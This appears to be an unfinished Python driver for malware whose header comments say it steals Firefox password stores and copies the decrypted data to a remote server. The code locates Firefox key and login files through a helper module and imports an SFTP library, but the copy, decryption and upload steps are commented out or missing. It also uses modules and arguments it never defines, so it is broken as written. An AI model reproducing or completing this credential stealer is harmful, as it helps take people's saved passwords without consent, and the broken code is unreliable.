## This is the driver file for the main program.
## This program is malicious by nature, do not run unless you intend to cause damage or understand what you are doing.
## I am not responsible for any damage or trouble you may get into by running this program.

## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.

import argparse
import Fireface
import pysftp
import shutil
import sys



# This function works to pull in command line arguments.
def grab_ComandLine(): # Function to grab command line arguments.
    parser = argparse.ArgumentParser()
    #parser.add_argument('-r', type=str, required=False)
    #parser.add_argument('-e', type=str, required=False)
    
    # Creates the variables that will hold the different arguments so this function can return them.
    args = parser.parse_args()
    commandArg1 = args.k
    commandArg2 = args.l
    # Returns the variables.
    return commandArg1, commandArg2



def moveFiles(keyFile, loginFile):
    key = keyFile
    login = loginFile
    currentDirectory = os.getcwd()
    shutil.copy(key, currentDirectory)
    shutil.copy(login, currentDirectory)

# Main Function
if __name__ == '__main__':
    # Calls the fileWalking() function to locate the key and logins files.
    #keyFile, loginFile = fileWalking()
    keyLocation, loginLocation = Fireface.fireFoxWalk()
    # Want to make a branch here the looks for something on the system.
    # If this flag is present the program will send the files of to a remote SFTP server, if the flag is not present, it will decrypt the files locally.
    #moveFiles(keyLocation, loginLocation)
    
    #os.system("./firepwd.py")
    print(keyLocation, loginLocation)
    print("This has finished")
    sys.exit(1)
        